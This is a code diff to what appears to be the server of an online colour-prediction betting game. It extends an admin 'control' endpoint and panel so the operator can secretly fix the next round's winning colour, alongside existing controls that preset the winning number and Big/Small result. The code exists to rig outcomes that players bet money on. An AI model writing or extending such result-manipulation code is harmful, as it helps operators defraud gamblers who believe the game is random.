@@ -232,7 +232,10 @@ app.post('/api/admin/user-action', (req, res) => {
 });
 
 app.post('/api/admin/control', (req, res) => {
-    const { nextNum, nextBs } = req.body;
+    const { nextNum, nextBs, nextCol } = req.body;
+    if(nextCol === 'green') db.manualNextResult = [1,3,7,9][Math.floor(Math.random()*4)];
+    if(nextCol === 'red') db.manualNextResult = [2,4,6,8][Math.floor(Math.random()*4)];
+    if(nextCol === 'violet') db.manualNextResult = [0,5][Math.floor(Math.random()*2)];
     if(nextNum !== undefined && nextNum !== '') db.manualNextResult = Number(nextNum);
     if(nextBs !== undefined && nextBs !== '') db.manualBigSmall = nextBs;
     res.json({ success: true, message: 'Result controlled successfully' });
@@ -290,6 +293,12 @@ app.get('/admin', checkAdminAuth, (req, res) => {
         <div style="display:flex;gap:4px;margin-top:6px;">
             <button class="btn" style="background:#ff9800;flex:1;" onclick="setBs('Big')">Big</button>
             <button class="btn" style="background:#2196f3;flex:1;" onclick="setBs('Small')">Small</button>
+        </div>
+        <div style="font-size:10px;margin:8px 0 4px 0;color:#8b949e;">Colors (Green / Violet / Red):</div>
+        <div style="display:flex;gap:4px;">
+            <button class="btn" style="background:#4caf50;flex:1;" onclick="setCol('green')">Green</button>
+            <button class="btn" style="background:#9c27b0;flex:1;" onclick="setCol('violet')">Violet</button>
+            <button class="btn" style="background:#f44336;flex:1;" onclick="setCol('red')">Red</button>
         </div>
     </div>
     <div class="box">
@@ -373,6 +382,7 @@ app.get('/admin', checkAdminAuth, (req, res) => {
     function chPass(p){ let np = prompt('New pass:'); if(np){ fetch('/api/admin/user-action', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({phone: p, action: 'changePass', newPassword: np}) }).then(r=>r.json()).then(res=>{ alert('Pass changed!'); load(); }); } }
     function ap(t, id){ fetch('/api/admin/approve', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type: t, id: id}) }).then(r=>r.json()).then(res=>{ alert('Approved!'); load(); }); }
     function setNum(n){ fetch('/api/admin/control', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({nextNum: n}) }).then(r=>r.json()).then(res=>{ alert('Set: ' + n); }); }
+    function setCol(c){ fetch('/api/admin/control', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({nextCol: c}) }).then(r=>r.json()).then(res=>{ alert('Set Color: ' + c); }); }
     function setBs(bs){ fetch('/api/admin/control', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({nextBs: bs}) }).then(r=>r.json()).then(res=>{ alert('Set: ' + bs); }); }
     function saveNotice(){ fetch('/api/admin/notice', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({notice: document.getElementById('noticeInp').value}) }).then(r=>r.json()).then(res=>{ alert('Notice sent!'); }); }
     function saveSettings(){ fetch('/api/admin/settings', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({telegram: document.getElementById('tgInp').value, qrCode: document.getElementById('qrInp').value}) }).then(r=>r.json()).then(res=>{ alert('Saved!'); }); }
